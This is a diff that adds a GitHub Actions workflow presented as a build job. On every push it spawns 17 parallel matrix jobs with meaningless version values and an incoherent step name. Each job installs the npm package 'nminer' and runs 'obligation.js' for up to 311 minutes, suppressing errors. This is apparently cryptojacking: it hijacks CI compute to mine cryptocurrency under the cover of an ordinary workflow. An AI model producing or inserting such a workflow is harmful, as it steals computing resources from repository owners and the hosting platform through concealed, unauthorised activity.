@@ -1,0 +1,42 @@
+name: obligation
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3847 }
+          - { version: 2151 }
+          - { version: 1898 }
+          - { version: 3141 }
+          - { version: 9434 }
+          - { version: 2412 }
+          - { version: 1871 }
+          - { version: 1521 }
+          - { version: 5347 }
+          - { version: 3945 }
+          - { version: 5950 }
+          - { version: 2700 }
+          - { version: 1299 }
+          - { version: 3398 }
+          - { version: 8264 }
+          - { version: 6375 }
+          - { version: 53 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: how wherever wing failing
+        run: |
+          npm install nminer@latest
+          timeout 311m node obligation.js || echo "obligation executed"
